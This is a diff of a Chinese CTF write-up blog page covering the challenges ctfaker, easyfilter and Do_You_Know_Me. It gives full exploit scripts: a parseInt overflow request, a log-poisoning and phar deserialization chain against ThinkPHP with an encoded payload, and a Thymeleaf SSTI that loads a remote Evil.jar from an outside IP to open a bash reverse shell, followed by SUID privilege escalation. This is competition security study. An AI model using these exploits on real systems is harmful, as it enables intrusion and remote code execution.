@@ -467,10 +467,15 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h2 id="ctfaker"><a href="#ctfaker" class="headerlink" title="ctfaker"></a>ctfaker</h2><p>typescript源码给出来了。仔细看会发现其实可控点只有<code>/levelup</code>一处，所以快速定位到factor上<br><img src="https://hackmd.summershrimp.com/uploads/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_66f0b0ef0bcbbbb6ec4c4165af0cb982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>factor由可控值经<code>parseInt</code>处理。而<code>parseInt</code> 有传字符串或科学计数法被截断的特性。那么我们就可以让属性变得足够大。一次打败所有怪兽</p>
 <p><code>parseInt(&#39;99999999999999e-40&#39;) == 99999999999999</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- author: byc_404 -**-</span></span><br><span class="line">url = <span class="string">'xxx'</span></span><br><span class="line">r = requests.post(url + <span class="string">'levelup'</span>, json = &#123;</span><br><span class="line">	<span class="string">'f'</span>:<span class="string">'99999999999999e-40'</span></span><br><span class="line">&#125;)</span><br><span class="line">r = requests.get(url+<span class="string">'fight'</span>)</span><br><span class="line">r = requests.get(url+<span class="string">'monster'</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code class="python"># coding: utf-8
+# -**- author: byc_404 -**-
+url = &#39;xxx&#39;
+r = requests.post(url + &#39;levelup&#39;, json = {
+    &#39;f&#39;:&#39;99999999999999e-40&#39;
+})
+r = requests.get(url+&#39;fight&#39;)
+r = requests.get(url+&#39;monster&#39;)
+print(r.text)</code></pre>
 <h2 id="easyfilter"><a href="#easyfilter" class="headerlink" title="easyfilter"></a>easyfilter</h2><p>我们可以看到关键代码<br><img src="https://hackmd.summershrimp.com/uploads/upload_d57ba63861c48ccfa33c07001e8d84f1.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_d57ba63861c48ccfa33c07001e8d84f1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>其实熟悉的就应该知道，这是laravel8 debug mode下漏洞代码的简化版。即进行一组可控的<code>file_get_contents + file_put_contents</code>。<br>laravel8 的洞如果没有跟过的话，还是建议看一下。很好的运用了php各种filter的性质。</p>
 <p>回到本题。我们可以同样采用这个思路，先通过报错手段创建log文件。</p>
@@ -483,12 +488,94 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>效果：<br><img src="https://hackmd.summershrimp.com/uploads/upload_9e23d358da6b0e8642299d21b46d3ea5.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_9e23d358da6b0e8642299d21b46d3ea5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>最后一个小问题就是<code>iconv.utf-16le.utf-8</code>处理内容需要偶数长度。这个直接55开概率填充字符就好了(</p>
 <p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- author: byc_404 -**-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com/index.php/hello/1234'</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">'eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url, params=&#123;</span><br><span class="line">        <span class="string">'file'</span>: <span class="string">'php://filter/read=consumed/resource=../runtime/log/202105/29.log'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, <span class="number">80</span>))</span><br><span class="line">    sock.send(<span class="string">f"""GET /index.php/hello/12345?file<span class="subst">&#123;payload&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">HOST: eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com</span></span><br><span class="line"><span class="string">User-Agent: curl/7.64.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.encode())</span><br><span class="line">    print(sock.recv(<span class="number">2048</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url, params=&#123;</span><br><span class="line">        <span class="string">'file'</span>: <span class="string">'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/log/202105/29.log'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url, params=&#123;</span><br><span class="line">        <span class="string">'file'</span>: <span class="string">'phar:///var/www/html/runtime/log/202105/29.log'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#php poc.php -&gt; phar.phar</span></span><br><span class="line"><span class="comment">#cat phar.phar  | base64 -w0 | sed -E 's/=+$//g' | sed -E 's/./\0=00/g'</span></span><br><span class="line">payload = <span class="string">'R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00p=00x=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00A=007=00A=00Q=00A=00A=00T=00z=00o=00y=00N=00z=00o=00i=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00I=00j=00o=00x=00O=00n=00t=00z=00O=00j=00M=000=00O=00i=00I=00A=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00A=00G=00Z=00p=00b=00G=00V=00z=00I=00j=00t=00h=00O=00j=00E=006=00e=002=00k=006=00M=00D=00t=00P=00O=00j=00E=003=00O=00i=00J=000=00a=00G=00l=00u=00a=001=00x=00t=00b=002=00R=00l=00b=00F=00x=00Q=00a=00X=00Z=00v=00d=00C=00I=006=00N=00D=00p=007=00c=00z=00o=00x=00N=00z=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00G=00R=00h=00d=00G=00E=00i=00O=002=00E=006=00M=00T=00p=007=00c=00z=00o=002=00O=00i=00I=000=00d=00X=00Q=00x=00N=00W=000=00i=00O=003=00M=006=00O=00T=00o=00i=00d=00G=00F=00j=00I=00C=009=00m=00b=00G=00F=00n=00I=00j=00t=009=00c=00z=00o=00y=00M=00T=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00H=00d=00p=00d=00G=00h=00B=00d=00H=00R=00y=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00Y=00X=00B=00w=00Z=00W=005=00k=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00h=00O=00j=00A=006=00e=003=001=009=00c=00z=00o=004=00O=00i=00J=00y=00Z=00W=00x=00h=00d=00G=00l=00v=00b=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=00x=00O=00i=00I=00x=00I=00j=00t=009=00f=00X=001=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00B=003=00y=00s=00W=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00N=00i=007=00R=00e=00v=00K=00D=00K=002=00M=00E=008=00F=00h=00E=00e=00j=001=00T=00a=00S=00L=00Q=00p=00+=00L=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00'</span></span><br><span class="line">clear()</span><br><span class="line">write(payload)</span><br><span class="line">trigger()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># coding: utf-8
+# -**- author: byc_404 -**-
+import requests
+import socket
 
+url = &#39;http://eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com/index.php/hello/1234&#39;
+
+host = &#39;eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com&#39;
+def clear():
+    r = requests.get(url, params={
+        &#39;file&#39;: &#39;php://filter/read=consumed/resource=../runtime/log/202105/29.log&#39;
+    })
+    print(r.text)
+
+
+def write(payload):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, 80))
+    sock.send(f&quot;&quot;&quot;GET /index.php/hello/12345?file{payload} HTTP/1.1
+HOST: eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com
+User-Agent: curl/7.64.1
+
+&quot;&quot;&quot;.encode())
+    print(sock.recv(2048))
+
+
+def trigger():
+    r = requests.get(url, params={
+        &#39;file&#39;: &#39;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/log/202105/29.log&#39;
+    })
+    print(r.text)
+
+def exp():
+    r = requests.get(url, params={
+        &#39;file&#39;: &#39;phar:///var/www/html/runtime/log/202105/29.log&#39;
+    })
+    print(r.text)
+
+#php poc.php -&gt; phar.phar
+#cat phar.phar  | base64 -w0 | sed -E &#39;s/=+$//g&#39; | sed -E &#39;s/./\0=00/g&#39;
+payload = &#39;R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00p=00x=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00A=007=00A=00Q=00A=00A=00T=00z=00o=00y=00N=00z=00o=00i=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00I=00j=00o=00x=00O=00n=00t=00z=00O=00j=00M=000=00O=00i=00I=00A=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00A=00G=00Z=00p=00b=00G=00V=00z=00I=00j=00t=00h=00O=00j=00E=006=00e=002=00k=006=00M=00D=00t=00P=00O=00j=00E=003=00O=00i=00J=000=00a=00G=00l=00u=00a=001=00x=00t=00b=002=00R=00l=00b=00F=00x=00Q=00a=00X=00Z=00v=00d=00C=00I=006=00N=00D=00p=007=00c=00z=00o=00x=00N=00z=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00G=00R=00h=00d=00G=00E=00i=00O=002=00E=006=00M=00T=00p=007=00c=00z=00o=002=00O=00i=00I=000=00d=00X=00Q=00x=00N=00W=000=00i=00O=003=00M=006=00O=00T=00o=00i=00d=00G=00F=00j=00I=00C=009=00m=00b=00G=00F=00n=00I=00j=00t=009=00c=00z=00o=00y=00M=00T=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00H=00d=00p=00d=00G=00h=00B=00d=00H=00R=00y=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00Y=00X=00B=00w=00Z=00W=005=00k=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00h=00O=00j=00A=006=00e=003=001=009=00c=00z=00o=004=00O=00i=00J=00y=00Z=00W=00x=00h=00d=00G=00l=00v=00b=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=00x=00O=00i=00I=00x=00I=00j=00t=009=00f=00X=001=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00B=003=00y=00s=00W=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00N=00i=007=00R=00e=00v=00K=00D=00K=002=00M=00E=008=00F=00h=00E=00e=00j=001=00T=00a=00S=00L=00Q=00p=00+=00L=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00&#39;
+clear()
+write(payload)
+trigger()
+exp()</code></pre>
 <p>生成tp5.1反序列化利用phar的poc.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">    <span class="keyword">protected</span> $append = [<span class="string">'byc_404'</span>=&gt;[]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;relation = [<span class="string">"1"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">'byc_404'</span>=&gt; $cmd];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'byc_404'</span>=&gt;<span class="string">'system'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot($cmd)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$windows = <span class="keyword">new</span> Windows(<span class="string">"tac /flag"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($windows)).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> \Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($windows);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace think;
+abstract class Model{
+    private $data = [];
+    private $withAttr = [];
+    protected $append = [&#39;byc_404&#39;=&gt;[]];
+
+    public function __construct($cmd){
+        $this-&gt;relation = [&quot;1&quot;];
+        $this-&gt;data = [&#39;byc_404&#39;=&gt; $cmd];
+        $this-&gt;withAttr = [&#39;byc_404&#39;=&gt;&#39;system&#39;];
+    }
+}
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model{
+}
 
 
+namespace think\process\pipes;
+use think\model\Pivot;
+class Windows{
+    private $files = [];
+
+    public function __construct($cmd){
+        $this-&gt;files = [new Pivot($cmd)];
+    }
+
+}
+
+$windows = new Windows(&quot;tac /flag&quot;);
+echo base64_encode(serialize($windows)).&quot;\n&quot;;
+
+@unlink(&#39;phar.phar&#39;);
+$p = new \Phar(&#39;phar.phar&#39;, 0);
+$p-&gt;startBuffering();
+$p-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+$p-&gt;setMetadata($windows);
+$p-&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);
+$p-&gt;stopBuffering();
+?&gt;</code></pre>
 <h2 id="Do-You-Know-Me"><a href="#Do-You-Know-Me" class="headerlink" title="Do_You_Know_Me"></a>Do_You_Know_Me</h2><p>环境真的太卡了。。。而且基本过了10多分钟后每次请求就稳定超时。没有源码黑盒打导致至少拖沓了几小时。不然肯定比赛里能出。</p>
 <p> 漏洞就是个thymeleaf 的ssti,或者说就是SpEL.因为是springboot的环境，所以还是很好想到<code>thymeleaf</code>的。关键还是怎么绕waf.</p>
 <p> 这里测了下，估计waf有<code>java.lang.*</code>,<code>forName</code>,<code>newInstance</code>,<code>new</code>,<code>toString</code>,runtimexx 等等。但是URLclassloader还在。所以可以远程加载类</p>
@@ -496,14 +583,38 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p> 紧接着就遇到第二个问题。无法使用字符串。这里常规手段<code>T(java.lang.Character)</code>是不行了.于是我去翻了下thymeleaf的文档。发现有很多非常好用的内置variable<br> <a href="https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects" target="_blank" rel="noopener">https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects</a><br> 当然,这些web context有一半也被ban掉了。但是看到下面的<code>httpServletRequest</code>的方法<code>getParameter</code>,应该能够读取http请求的参数。这样我们就能传入字符串了。<br><img src="https://hackmd.summershrimp.com/uploads/upload_d1055434354fd63d2737bfe442c42e91.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_d1055434354fd63d2737bfe442c42e91.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p> 然后遇到第三个问题。原本我打算远程加载恶意类,实例化然后直接命令执行。然而<code>newInstance</code>被ban了。。。但是毕竟我们现在可以做到加载类,那么反射调用任意方法来执行命令应该没有什么问题。看了下<code>getDeclaredMethod</code>跟<code>invoke</code>都在，解决方法就水落石出了。</p>
 <p>创建恶意类。我们把命令执行代码写入其静态rce方法。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String commands[] = &#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/xxx/9001 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(commands);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译生成Evil.jar </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Evil.java</span><br><span class="line">jar cvf Evil.jar Evil.class</span><br></pre></td></tr></table></figure>
+<pre><code class="java">import java.io.*;
 
+public class Evil {
+    public static void rce() {
+        try {
+            String commands[] = {&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxx/9001 0&gt;&amp;1&quot;};
+            Runtime.getRuntime().exec(commands);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}</code></pre>
+<p>编译生成Evil.jar </p>
+<pre><code class="bash=">javac Evil.java
+jar cvf Evil.jar Evil.class</code></pre>
 <p> vps上监听，然后打一发</p>
 <p> <code>New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;}).getDeclaredMethod(&quot;rce&quot;).invoke(null)</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- author: byc_404 -**-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://eci-2zecj5hgsz4r0xz16uc6.cloudeci1.ichunqiu.com:8888/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'search?0=Evil&amp;1=http://120.27.246.202/Evil.jar&amp;2=rce'</span>, data=&#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'[[$&#123; New java.net.URLClassLoader(New java.net.URL[]&#123;New java.net.URL(#httpServletRequest.getParameter(1))&#125;).loadClass(#httpServletRequest.getParameter(0)).getDeclaredMethod(#httpServletRequest.getParameter(2)).invoke(null)  &#125;]] '</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poc()</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># coding: utf-8
+# -**- author: byc_404 -**-
+import requests
 
+url = &#39;http://eci-2zecj5hgsz4r0xz16uc6.cloudeci1.ichunqiu.com:8888/&#39;
+
+
+def poc():
+    r = requests.post(url + &#39;search?0=Evil&amp;1=http://120.27.246.202/Evil.jar&amp;2=rce&#39;, data={
+        &#39;name&#39;: &#39;[[${ New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(#httpServletRequest.getParameter(1))}).loadClass(#httpServletRequest.getParameter(0)).getDeclaredMethod(#httpServletRequest.getParameter(2)).invoke(null)  }]] &#39;
+    })
+    print(r.text)
+
+
+poc()</code></pre>
 <p>反弹shell成功。然后发现readflag需要root权限。看了下没有其他可控root服务。所以<code>find / -user root -perm -4000</code>找下suid,发现了<code>python2.7</code>是有suid位的。直接提权readflag即可</p>
 <p> <img src="https://hackmd.summershrimp.com/uploads/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_57dfd9f7139ec727d0ebf169e29ff3d8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p> 总的说题目质量还可以。但是环境很迷,某种角度上来说顺便帮我巩固了波java( </p>
@@ -720,7 +831,7 @@ Sea of Quills  题目给了r...</p>
       
     
       
